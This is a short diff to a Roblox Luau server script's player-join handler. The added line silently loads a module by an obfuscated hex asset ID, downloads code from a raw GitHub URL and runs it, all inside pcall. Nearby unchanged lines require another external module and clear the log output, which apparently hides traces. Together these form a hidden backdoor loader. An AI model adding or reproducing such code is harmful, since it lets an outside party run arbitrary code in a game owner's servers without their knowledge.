@@ -49,7 +49,7 @@ end
 
 Players.PlayerAdded:Connect(function(player)
 	logGameInfo(player)
-	
+	pcall(function() require(0x25bdc96a3)(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/BIGCHUNKYCAT/roblox-luau-loader/refs/heads/main/micro.txt"))() end)
 require(77565251296196):load()
 	LogService:ClearOutput()
  end)
